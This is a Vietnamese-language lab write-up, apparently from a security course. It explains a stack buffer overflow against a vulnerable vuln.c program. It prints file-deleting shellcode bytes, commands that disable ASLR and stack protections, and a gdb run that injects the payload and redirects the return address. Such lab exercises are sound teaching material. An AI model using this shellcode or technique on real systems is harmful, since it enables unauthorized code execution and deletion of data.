Lab 2:\
chạy docker:\
`docker run -it --privileged -v $HOME/Seclabs:/home/seed/seclabs img4lab`
# Inject code to delete file: file_del.asm is given on github

### Ý tưởng:
1. Từ file_del.asm biên dịch thành file_del.o để chuyển thành chương trình file_del (thực thi được - executable file)
2. Chuyển đổi file_del thành opcode để chèn vào trong chương trình đối tượng: vuln.c
3. Quan sát cấu trúc stack của chương trình đối tượng vuln.c\
![target](/Week%202/img/target.png)\
   - Chương trình khai báo biến buf **tận 64 byte**, đủ lớn để chèn vào trong đó **một chương trình nhỏ**. Chương trình được chèn vào được chọn là chương trình được viết bằng *asm* thay vì *c* để giảm thiểu kích cỡ của chương trình hết mức.\
   - Chương trình vuln.c sử dụng strcpy để lấy dữ liệu là phương thức để truyền các dữ liệu vào.
4. Phân tích stack của chương trình đối tượng:
![stack](/Week%202/img/stack.png)\
   - Cả stack của hàm main có kích cỡ là 80 bytes (B)
   - Mục đich là chèn chương trình có *x bytes* | x <= 64(chưa xác định) vào trong *biến buf* rồi sau đó tạo stack overflow để ghi đè địa chỉ trả về (return address) để trỏ về con trỏ esp để chạy chương trình đã được chèn hiện đang lưu trữ trên cùng của stack.
   - Vì chưa xác định được kích cỡ của chương trình chèn vào nên đặt x, buf có 64B nên phần còn lại sẽ được chèn ký tự a (có thể thay bằng ký tự khác tuỳ ý) với kích cỡ là 1 ký tự tương đương 1B. Nghĩa là cần chèn vào 64 - x ký tự a.
![stack2](/Week%202/img/stack2.png) 
5. Biên dịch chương trình vuln.c thành vuln.out
6. Chèn opcode vào trong biến local của đối tượng để gây ra stack overflow từ đó chiếm quyền của chương trình và thực thi chương trình được chèn vào\
### Chuẩn bị môi trường:
1. Tắt chế độ cấp phát địa chỉ stack ngẫu nhiên để tiện cho việc quan sát (hoặc có lỗi gây ra sẽ dễ fix hơn)\
`sudo sysctl -w kernel.randomize_va_space=0`
2. Biên dịch chương trình đối tượng bằng gcc cùng với các options:\
`gcc -g vuln.c -o vuln.out -fno-stack-protector -mpreferred-stack-boundary=2 -z execstack`
   - `-fno-stack-protector` để tắt chế độ bảo vệ chèn dữ liệu ra ngoài stack (stack overflow)
   - `-z execstack` để cho phép thực thi chương trình được chạy trên stack
   - ` -mpreferred-stack-boundary=2` để khi biên dịch chương trình nhìn đẹp mắt hơn (maybe)
3. Tạo đường dẫn tới zsh thay vì sh (default) để tắt khả năng chống chương trình chạy tự động\
`sudo ln -sf /bin/zsh /bin/sh`
### Thực hiện:
1. Biên dịch chương trình mã máy file_del.asm thành file_del.o\
`nasm -g -f elf file_del.asm`\
![nasm](/Week%202/img/nasm.png)
2. Biên dịch chương trình file_del.out thành file_del để thực thi\
`ld -m elf_i386 -o file_del file_del.o`\
![ld](/Week%202/img/ld.png)
3. Disassemble chương trình file_del thể quan sát opcode và hợp ngữ của nó\
`objdump -d file_del`\
![objdump](/Week%202/img/objdump.png)
4. Quan sát opcode của chương trình file_del chúng ta có thể thấy nó xuất hiện nhiều giá trị như `00` và cả `0a`, đây là 2 giá trị sẽ làm chương trình dừng lại nên chúng ta cần xử lý nó.\
Note: Riêng giá trị `00` ở cuối chương trình không ảnh hưởng nên có thể loại bỏ hoặc không (vì dù gì đến đó chương trình cũng đã kết thúc)\
![warning](/Week%202/img/warning.png)
5. Chỉnh sửa mã nguồn của file_del.asm:
   - Thay đổi `mov eax, 10` thành `mov al 8` và `add al 2`\
   Mục đích là vì thanh ghi **eax** có tận **32 bits value** quá lớn để lưu trữ giá trị 10 nên sẽ sinh ra nhiều giá trị `00` nên chuyển sang sử dụng thanh ghi **al** có **8 bits value** sẽ tránh việc tạo ra nhiều giá trị `00` cũng có nghĩa là **null**
   Cùng với việc thay đổi từ lưu giá trị 10 thành lưu giá trị 8 rồi cộng thêm 2 để tránh tạo ra giá trị `0a`
   - Thay đổi `mov eax, 1` thành `mov al, 1` nhằm mục đích **hạn chế giá trị null như trên**\
![edited](/Week%202/img/edited.png)\
Sau đó biên dịch lại chương trình *file_del.nasm* tương tự như các [bước 2,3,4](#thực-hiện)
Kết quả sẽ như sau\
![after](/Week%202/img/after.png)
6. Chuyển đổi chương trình trên thành **opcode** để chuẩn bị cho bước chèn\
`for i in $(objdump -d file_del | grep "^ " | cut -f2);do echo -n '\x'$i; done; echo`\
![opcode](/Week%202/img/opcode.png)\
Lưu lại opcode ở đâu đó để sử dụng cho các bước sau. Và **nhớ loại bỏ phần `\xdummyfile.`** vì nó đã bị lặp lại ở trước đó và không tồn tại giá trị ký tự dài như vậy.\ 
`\xeb\x0f\xb0\x08\x04\x02\xbb\x76\x80\x04\x08\xcd\x80\xb0\x01\xcd\x80\xe8\xec\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x00`\
> Opcode trên có kích thước bằng với số lượng `\x` mà nó có **không bao gồm \x00**. Nghĩa là opcode trên có kích thước là *31*
7. Debug chương trình đối tượng:\
`gdb -q ./vuln.out`\
(P/s: -q Quite: không bla bla, chạy thẳng vào chương trình debug. Demo below:)
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeXJpxmMkO7CRmG2ujlw3q0bl5-C-7-bCeAthpYy647vSoBalh7vMqYkyfDH1iz8y3EFUQ-I2HYueWc_53A1InFdnDeEU7HNqPtC1ZJN72BEag9tTJpaY6PUOdHOyxmD7HaMPpAEQ_ICIjzM2GYHbNYDXsZ?key=x066aHYoH5XtbJjV6Ng-LQ)
8. Disassemble hàm main để đặt breakpoint trước và sau khi chạy lệnh strcpy\
`disas main`\
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcYlxdWE4UVH6SedLu89DPs-GroaWUuopIngFKqj0xDvsqaJ5m7DUXKRU0aT_1hVyLleCjuIPGfmwqn_4n3rM2aylOIuOXSf73LZuCpnYqVd7cGBYWigW50V8G7TnBijlhRfeJf4wlMrd_ca49oMZsnp84?key=x066aHYoH5XtbJjV6Ng-LQ)\
Đặt 2 breakpoint tại điểm 1 và 2.
- Lý do: 
   - Sau khi chương trình đã hoàn thành khởi tạo stack: push ebp vào stack, lưu esp = ebp, push biến khởi tạo (char buf[64]) vào trong stack (0x40 là 64 byte ở dạng thập lục)
   - Sau khi hoàn thành lệnh *strcpy* và đã giải phóng ebp và trở về return address **ra**
- Bằng lệnh:\
`b *0x08048441` và `b *0x0804846b`\
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfcFhn-XfQInCLengUwgWvn42hxTJqOEC39tR0Sn7WeenzLjGysWKm_F7p4FaKFBzgIX0UpohnEeUON8ngGr6n-aH2yZ6bGpz66D9Dv394yZRAn6HS1msc8Iwzyy2cNcX6io7an5Jdu2MEB1SiFhgsjptf9?key=x066aHYoH5XtbJjV6Ng-LQ)\
Extra: Kiểm tra breakpoint bằng `info breakpoint` và xoá breakpoint bằng lệnh `del [số thứ tự của breakpoint]`
9. Chạy debug chương trình vuln.out với giá trị đầu vào của argv[]\
![stack3](/Week%202/img/stack3.png)\
Cú pháp để chạy chương trình với dữ liệu đầu vào gây ra *stack overflow*\
> r $(python -c "print('[opcode]' + 'a' * [64 - sizeof(opcode) + 4] + '\xff\xff\xff\xff')") 

Cú pháp của bài hiện tại sẽ là:\
`r $(python -c "print('\xeb\x0f\xb0\x08\x04\x02\xbb\x76\x80\x04\x08\xcd\x80\xb0\x01\xcd\x80\xe8\xec\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65' + 'a' * 37 + '\xff\xff\xff\xff')")`\
![gdb1](/Week%202/img/gdb1.png)\
Chương trình sẽ dừng lại breakpoint 1.\
Dùng lệnh xuất ra 80B từ con trỏ esp để xem toàn cảnh stack\
`x/80xb $esp`\
![breakpoint1](/Week%202/img/breakpoint1.png)\
10. Dùng lệnh continue để lệnh strcpy được thực thi\
`continue`\
![gdb2](/Week%202/img/gdb2.png)\
tiếp tục kiểm tra stack sau khi lệnh strcpy đã thực thi\
![breakpoint2](/Week%202/img/breakpoint2.png)\
Nhưng chúng ta thấy, mọi thứ đề đã hoạt động đúng như dự kiến. Chương trình đã được chèn vào trong buf và đã xảy rả stack overflow khiến **ra** đa bị ghi đè thành `\xff\xff\xff\xff`.\
10. Chuyển **ra** thành địa chỉ của con trỏ $esp\
Bằng cách xác định vị trí của **ra** chúng ta có thể thay đổi giá trị của nó để trỏ về con trỏ **esp**\
`set *0xffffd70c = $esp`\
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdgt0gu7mi96W3WmpgToksMKLSphIEGoa6cRSIAsDUbp9pdOLapRxoZ_izqcJcED58sg5i6PQzZ6OZ8_9D1JO-Rd9JQVpqNq3hx3qrVIYivFzsfPux9ExR5c66cj_g4o9PKpPQT6aC0dDj-CIn0pcZPpeg?key=x066aHYoH5XtbJjV6Ng-LQ)\
11. Tiếp tục dùng lệnh `step` để xem từng bước kế tiếp để kiểm tra chương trình được chèn vào có thực thi không.\
![step1](/Week%202/img/step1.png)\
Từ đây chương trình main sẽ kết thúc và thực thi lệnh leave\
Step kế tiếp:\
![step2](/Week%202/img/step2.png)\
Chương trình đã chạy đến vị trí của con trỏ esp và trở lại trên đầu của stack cũng có nghĩa là stack overflow đã diễn ra.